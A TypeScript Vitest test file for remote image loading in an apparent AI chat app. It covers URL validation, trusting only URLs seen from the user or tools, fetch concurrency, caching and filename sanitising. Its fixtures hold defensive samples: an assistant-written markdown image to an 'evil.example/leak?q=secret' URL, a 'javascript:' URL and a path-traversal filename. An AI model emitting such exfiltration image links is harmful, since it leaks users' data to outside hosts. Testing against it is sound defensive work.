import { afterEach, describe, expect, it, vi } from 'vitest';
import {
  imageFileName, imageHost, loadRemoteImage, remoteImageEvidence, remoteImageUrl, setRemoteImageFetcher, urlSeenIn,
  REMOTE_IMAGE_CACHE, REMOTE_IMAGE_CONCURRENCY,
} from './remoteImages.js';

afterEach(() => setRemoteImageFetcher(null));

const image = (url: string) => ({ dataUrl: 'data:image/png;base64,AA==', mime: 'image/png', bytes: 1, finalUrl: url });

describe('remoteImageUrl', () => {
  it('accepts http(s) only', () => {
    expect(remoteImageUrl('https://example.com/a.jpg')).toBe('https://example.com/a.jpg');
    expect(remoteImageUrl('http://example.com/a b.jpg')).toBeNull();
    for (const bad of ['javascript:alert(1)', 'data:image/png;base64,AA', 'file:///c:/a.png', '//server/a.png', 'C:\\a.png', 'ftp://x/a.png']) {
      expect(remoteImageUrl(bad), bad).toBeNull();
    }
  });
});

describe('which remote images load by themselves', () => {
  const messages = [
    { role: 'user', content: 'what does it look like? https://user.example/photo.png' },
    { role: 'assistant', content: 'Let me search. ![made up](https://evil.example/leak?q=secret)' },
    { role: 'tool', content: '', toolResult: { output: 'results: <img src="https://cdn.example.com/a.jpg?w=1&amp;h=2"> {"u":"https:\\/\\/json.example\\/b.png"}' } },
  ];
  const evidence = remoteImageEvidence(messages);

  it('trusts URLs the chat saw in tool results or from the user', () => {
    expect(urlSeenIn(evidence, 'https://user.example/photo.png')).toBe(true);
    expect(urlSeenIn(evidence, 'https://cdn.example.com/a.jpg?w=1&h=2')).toBe(true); // HTML-escaped in the page
    expect(urlSeenIn(evidence, 'https://json.example/b.png')).toBe(true); // JSON-escaped
  });

  it('does not trust a URL only the model wrote', () => {
    expect(evidence).not.toContain('evil.example');
    expect(urlSeenIn(evidence, 'https://evil.example/leak?q=secret')).toBe(false);
    expect(urlSeenIn('', 'https://user.example/photo.png')).toBe(false);
  });
});

describe('loadRemoteImage', () => {
  it('shares one fetch per URL and retries after a failure', async () => {
    const fetcher = vi.fn().mockRejectedValueOnce(new Error('offline')).mockImplementation(async (u: string) => image(u));
    setRemoteImageFetcher(fetcher);
    await expect(loadRemoteImage('https://a.example/1.png')).rejects.toThrow('offline');
    const [a, b] = await Promise.all([loadRemoteImage('https://a.example/1.png'), loadRemoteImage('https://a.example/1.png')]);
    expect(a).toBe(b);
    expect(fetcher).toHaveBeenCalledTimes(2);
  });

  it(`runs at most ${REMOTE_IMAGE_CONCURRENCY} fetches at once`, async () => {
    let running = 0;
    let peak = 0;
    const releases: Array<() => void> = [];
    setRemoteImageFetcher(async (u) => {
      running += 1;
      peak = Math.max(peak, running);
      await new Promise<void>((r) => releases.push(r));
      running -= 1;
      return image(u);
    });
    const all = Array.from({ length: 10 }, (_, i) => loadRemoteImage(`https://a.example/${i}.png`));
    for (let i = 0; i < 10; i += 1) {
      await new Promise((r) => setTimeout(r, 0));
      releases.shift()?.();
    }
    await Promise.all(all);
    expect(peak).toBe(REMOTE_IMAGE_CONCURRENCY);
  });

  it('keeps a bounded cache', async () => {
    const fetcher = vi.fn(async (u: string) => image(u));
    setRemoteImageFetcher(fetcher);
    for (let i = 0; i <= REMOTE_IMAGE_CACHE; i += 1) await loadRemoteImage(`https://a.example/${i}.png`);
    await loadRemoteImage(`https://a.example/${REMOTE_IMAGE_CACHE}.png`);
    expect(fetcher).toHaveBeenCalledTimes(REMOTE_IMAGE_CACHE + 1);
    await loadRemoteImage('https://a.example/0.png'); // evicted, fetched again
    expect(fetcher).toHaveBeenCalledTimes(REMOTE_IMAGE_CACHE + 2);
  });
});

describe('names', () => {
  it('names a saved image after its URL and real type', () => {
    expect(imageFileName('https://x.com/p/products003153.jpeg?x=1', 'image/jpeg')).toBe('products003153.jpg');
    expect(imageFileName('https://x.com/', 'image/webp')).toBe('nekko-agent-image.webp');
    expect(imageFileName('https://x.com/a%20b..%2F..%2Fevil.png', 'image/png')).toBe('a-b..-..-evil.png');
    expect(imageHost('https://www.hamilex.hayami.co.jp/a.jpg')).toBe('hamilex.hayami.co.jp');
  });
});
